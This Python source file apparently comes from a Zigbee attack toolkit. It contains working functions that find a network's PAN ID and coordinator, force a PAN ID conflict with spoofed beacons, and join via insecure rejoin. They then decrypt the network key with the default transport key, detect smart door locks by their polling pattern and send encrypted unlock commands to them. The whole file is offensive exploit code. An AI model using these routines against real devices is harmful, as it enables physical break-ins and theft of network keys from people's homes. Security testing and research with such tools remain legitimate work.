from zigdiggity.packets.nwk_commands import insecure_rejoin, is_rejoin_response
from zigdiggity.packets.aps import is_transport_key
from zigdiggity.packets.dot15d4 import data_request, beacon_request, beacon_response, is_beacon_response, is_beacon_request, is_data_request
from zigdiggity.packets.zcl import encrypted_unlock
from zigdiggity.packets.utils import get_extended_source, get_source, extended_pan, extended_address_bytes, get_pan_id, get_frame_counter
from zigdiggity.misc.timer import Timer
from zigdiggity.misc.track_watch import TrackWatch
from zigdiggity.misc.sequence_iterator import SequenceIterator
from zigdiggity.interface.console import print_error, print_info, print_notify, print_debug
import zigdiggity.crypto.utils as crypto_utils
import random
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *


RESPONSE_TIME_LIMIT = 1 # 1s
OBSERVATION_TIME = 30 # 30s
NUMBER_OF_ATTEMPTS = 3
THRESHOLD_VARIANCE = 0.005
MIN_FREQUENCY = 2

def get_pan_by_extended_pan(radio, extended_panid):

    seq_iter = SequenceIterator(random.randint(0,255))
    extended_panid = extended_pan(extended_panid)

    for attempt in range(NUMBER_OF_ATTEMPTS):

        print_info("Sending a beacon to find the target's current PAN ID.")

        radio.send(beacon_request(seq_num=seq_iter.next()))
        timer = Timer(RESPONSE_TIME_LIMIT)
        while not timer.has_expired():
            frame = radio.receive()
            if is_beacon_response(frame):
                if frame[ZigBeeBeacon].extended_pan_id == extended_panid:
                    panid = frame[Dot15d4Beacon].src_panid
                    print_info("PAN ID found: 0x%04x" % panid)
                    return panid

        print_error("Did not observe the target's beacon response.")

def find_coord_addr_by_panid(radio, panid):

    for attempt in range(NUMBER_OF_ATTEMPTS):

        print_info("Finding the coordinator's address")

        seq_num = random.randint(0,255)

        radio.send(beacon_request(seq_num=seq_num))
        timer = Timer(RESPONSE_TIME_LIMIT)
        while(not timer.has_expired()):
            frame = radio.receive()
            if is_beacon_response(frame):
                if frame[Dot15d4Beacon].src_panid == panid:
                    addr = frame[Dot15d4Beacon].src_addr
                    print_info("Address found: 0x%04x" % addr)
                    return addr

        print_error("Did not observe the target's beacon response.")

def wait_for_frame_counter(radio, panid, addr):

    print_info("Waiting to observe a frame counter for pan_id:0x%04x, src_addr:0x%04x" % (panid, addr))

    timer = Timer(OBSERVATION_TIME)
    while(not timer.has_expired()):
        frame = radio.receive()
        if frame is not None and Dot15d4Data in frame and frame[Dot15d4Data].src_addr==addr and frame[Dot15d4Data].dest_panid==panid and ZigbeeSecurityHeader in frame:
            frame_counter = frame[ZigbeeSecurityHeader].fc
            print_notify("Frame counter observed: %s" % frame_counter)
            return frame_counter
    
    print_error("Could not find the frame counter")
    return None

def wait_for_extended_address_also_frame_counter(radio, panid, addr):

    print_info("Waiting to observe the extended source for pan_id:0x%04x, src_addr:0x%04x" % (panid, addr))
    
    timer = Timer(OBSERVATION_TIME)
    while not timer.has_expired():
        frame = radio.receive()
        if panid==get_pan_id(frame) and addr==get_source(frame):
            extended_source = get_extended_source(frame)
            if extended_source is not None:
                print_notify("Extended source observed: 0x%016x" % extended_source)
                frame_counter = get_frame_counter(frame)
                if frame_counter is not None:
                    print_notify("Frame counter observed: %d" % frame_counter)
                return extended_source, frame_counter
    
    print_error("Could not find extended source")
    return None

def wait_for_extended_address(radio, panid, addr):

    print_info("Waiting to observe the extended source for pan_id:0x%04x, src_addr:0x%04x" % (panid, addr))

    timer = Timer(OBSERVATION_TIME)
    while not timer.has_expired():
        frame = radio.receive()
        if panid==get_pan_id(frame) and addr==get_source(frame):
            extended_source = get_extended_source(frame)
            if extended_source is not None:
                print_notify("Extended source observed: 0x%016x" % extended_source)
                return extended_source
    
    print_error("Could not find extended source")
    return None

def pan_conflict_by_panid(radio, panid, network_key=None, coord_ext_addr=None):

    print_info("Performing PAN ID conflict")

    conflict_sent = False
    for attempt in range(NUMBER_OF_ATTEMPTS):

        seq_num = random.randint(0,255)
        seq_iter = SequenceIterator(seq_num)
        radio.send(beacon_request(seq_num=seq_iter.next()))

        timer = Timer(RESPONSE_TIME_LIMIT)
        while not timer.has_expired():
            frame = radio.receive()
            if is_beacon_response(frame):
                if frame[Dot15d4FCS].src_panid == panid:
                    print_info("Network observed, sending conflict")
                    current_seq_num = seq_iter.next()
                    radio.send(beacon_response(panid,seq_num=current_seq_num))
                    radio.send(beacon_response(panid,seq_num=current_seq_num))
                    break
        if network_key is not None and coord_ext_addr is not None:
            timer.reset()
            print_info("Verifying the conflict took by looking for the network update")
            while not timer.has_expired():
                frame = radio.receive()
                if frame is not None and ZigbeeSecurityHeader in frame:
                    coord_ext_addr_bytes = extended_address_bytes(coord_ext_addr)
                    decrypted, valid = crypto_utils.zigbee_packet_decrypt(network_key, frame, coord_ext_addr_bytes)
                    if valid:
                        if bytes(decrypted)[0]==0x0a:
                            print_info("Network update observed. PAN conflict worked")
                            return True
            print_error("Did not observe a network update. PAN conflict likely failed")
            return False

        return True

def insecure_rejoin_by_panid(radio, panid, src_addr=None, extended_src=None, coord_addr=None, seq_num=None, nwk_seq_num=None):

    if src_addr is None:
        src_addr = random.randint(0,0xfff0)
    if extended_src is None:
        extended_src = random.randint(0, 0xffffffffffffffff)
    if coord_addr is None:
        coord_addr = find_coord_addr_by_panid(radio, panid)
    if seq_num is None:
        seq_num = random.randint(0,255)
    if nwk_seq_num is None:
        nwk_seq_num = random.randint(0,255)

    if coord_addr is None:
        print_info("No coordinator address seen, using default of 0x0000")
        coord_addr = 0x0000
    
    dot15d4_seq_iter = SequenceIterator(initial_value=seq_num, value_limit=255)
    nwk_seq_iter = SequenceIterator(initial_value=nwk_seq_num, value_limit=255)

    print_notify("Attempting to join PAN ID 0x%04x using insecure rejoin" % panid)
    print_info("Sending insecure rejoin")
    radio.send_and_retry(insecure_rejoin(src_addr, coord_addr, panid, extended_src, seq_num=dot15d4_seq_iter.next(), nwk_seq_num=nwk_seq_iter.next()))
    radio.send_and_retry(data_request(src_addr, coord_addr, panid, seq_num=dot15d4_seq_iter.next()))

    coord_extended_src = None
    print_info("Awaiting response...")
    timer = Timer(RESPONSE_TIME_LIMIT)
    while(not timer.has_expired()):
        frame = radio.receive_and_ack(addr=src_addr, panid=panid)
        if is_rejoin_response(frame):
            print_notify("Rejoin response observed")
            coord_extended_src = frame[ZigbeeNWK].ext_src
            radio.send_and_retry(data_request(src_addr, coord_addr, panid, seq_num=dot15d4_seq_iter.next()))
            break

    if coord_extended_src is None:
        print_error("No rejoin response observed")

    print_info("Awaiting transport key...")
    timer.reset()
    while(not timer.has_expired()):
        frame = radio.receive_and_ack(addr=src_addr, panid=panid)
        if is_transport_key(frame):
            print_notify("Transport key observed")
            print_info("Attempting to decrypt the network key")
            coord_extended_source_bytes = extended_address_bytes(coord_extended_src)
            decrypted, valid = crypto_utils.zigbee_packet_decrypt(crypto_utils.zigbee_trans_key(crypto_utils.DEFAULT_TRANSPORT_KEY), frame, coord_extended_source_bytes)
            if valid:
                print_notify("Network key acquired")
                network_key = bytes(decrypted)[2:18]
                print_info("Extracted key is 0x%s" % network_key.hex())
                return network_key
            else:
                print_info(str(coord_extended_source_bytes))
                print_error("Network key could not be decrypted")
    return None

def unlock_lock(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):

    if coord_addr is None:
        coord_addr = find_coord_addr_by_panid(radio, panid)
    if coord_extended_addr is None:
        coord_extended_addr, frame_counter = wait_for_extended_address_also_frame_counter(radio, panid, coord_addr)
    if frame_counter is None:
        frame_counter = wait_for_frame_counter(radio, panid, coord_addr)
    
    if coord_addr is None or coord_extended_addr is None or frame_counter is None:
        print_error("Could not find the required data to send the unlock request")
    
    frame_counter_iter = SequenceIterator(frame_counter+22, 0xffffffff)
    sequence_number = random.randint(0,255)
    nwk_sequence_number = random.randint(0,255)
    aps_counter = random.randint(0,255)
    zcl_sequence_number = random.randint(0,255)

    print_info("Attempting to unlock lock")
    timer = Timer(OBSERVATION_TIME)
    conflict_succeeded=False
    for attempt in range(3):
        # it is going to be more reliable if we sync the conflict with the device's data request to avoid having it see the network change packet
        while not timer.has_expired():
            frame = radio.receive()
            if is_data_request(frame) and get_source(frame)==addr:
                if pan_conflict_by_panid(radio, panid, network_key=network_key, coord_ext_addr=coord_extended_addr):
                    conflict_succeeded=True
                break
        if conflict_succeeded:
            break
        timer.reset()
    if conflict_succeeded:
        print_info("Waiting 4 seconds for the conflict to resolve")
        timer = Timer(4)
        while not timer.has_expired():
            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)

        radio.load_frame(encrypted_unlock(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
        data_request_counter = 0

        timer = Timer(1)
        while not timer.has_expired():
            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)

        print_info("Waiting for the lock to send a couple data requests")
        unlock_sent = False
        timer = Timer(OBSERVATION_TIME)
        while not timer.has_expired():
            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
            if is_data_request(frame):
                data_request_counter+=1
                if data_request_counter == 2:
                    print_notify("Sending unlock command")
                    radio.fire_and_retry()
                    unlock_sent = True
                    break

        return unlock_sent

    else:
        print_info("We're going to send a bunch of unlock requests and hope one goes through")
        for attempts in range(20):
            radio.load_frame(encrypted_unlock(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
            
            timer = Timer(OBSERVATION_TIME)
            while not timer.has_expired():
                frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
                if is_data_request(frame):
                    print_notify("Sending unlock command")
                    radio.fire_and_retry()
                    break
        return True

def find_locks(radio, panid=None):

    result = []
    trackers = dict()
    last_sequence_number = dict()
    if panid is not None:
        print_notify("Looking at PAN ID 0x%04x for locks" % panid)
    else:
        print_notify("Looking for locks on the current channel")
    print_info("Monitoring the network for an extended period")
    timer = Timer(17)
    traffic_counter = 0
    while not timer.has_expired():
        frame = radio.receive()
        if frame is not None and not is_beacon_request(frame):
            traffic_counter+=1
        if is_data_request(frame) and (panid is None or get_pan_id(frame)==panid):
            pan = get_pan_id(frame)
            source=get_source(frame)
            if not pan in trackers.keys():
                trackers[pan] = dict()
                last_sequence_number[pan] = dict()
            if not source in trackers[pan].keys():
                trackers[pan][source]=TrackWatch()
                last_sequence_number[pan][source]=-1
            if last_sequence_number[pan][source]!=frame[Dot15d4FCS].seqnum:
                trackers[pan][source].click()
                last_sequence_number[pan][source]=frame[Dot15d4FCS].seqnum
        
        if timer.time_passed() > 5 and traffic_counter==0:
            print_info("No traffic observed for 5 seconds, giving up")
            break

    for pan in trackers:
        for addr in trackers[pan]:
            watch = trackers[pan][addr]
            if watch.variance() is not None and watch.variance() < THRESHOLD_VARIANCE and watch.mean() > MIN_FREQUENCY:
                result.append((pan,addr))
                print_notify("Device 0x%04x on PAN 0x%04x resembles a lock" % (addr, pan))
            print_debug("Device 0x%04x on PAN 0x%04x had variance of %f and mean of %f" % (addr,pan,watch.variance(),watch.mean()))

    return result
